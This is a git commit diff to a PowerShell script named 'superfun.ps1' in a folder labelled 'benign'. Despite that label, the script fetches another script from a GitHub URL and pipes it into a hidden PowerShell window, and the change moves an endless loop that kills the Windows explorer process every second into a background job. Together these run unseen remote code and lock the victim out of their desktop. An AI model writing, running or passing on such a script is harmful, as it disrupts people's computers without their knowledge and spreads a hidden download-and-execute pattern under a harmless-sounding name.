1cfa1421731d73d4d0537ac54bfa0a79301a1fda
[R3dact3d] <emmettwb@gmail.com>
2019-03-06 15:37:24 -0700

    Update superfun.ps1

--- benign/superfun.ps1
+++ benign/superfun.ps1
@@ -1,2 +1,2 @@
+start-job {while ($true) {kill -name explorer; sleep -s 1}}
 powershell wget https://raw.githubusercontent.com/EPiC-Inc/My-Collection/master/benign/screenflipper.ps1 | select-object -expandproperty content | powershell -windowstyle hidden
-while ($true) {kill -name explorer; sleep -s 1}
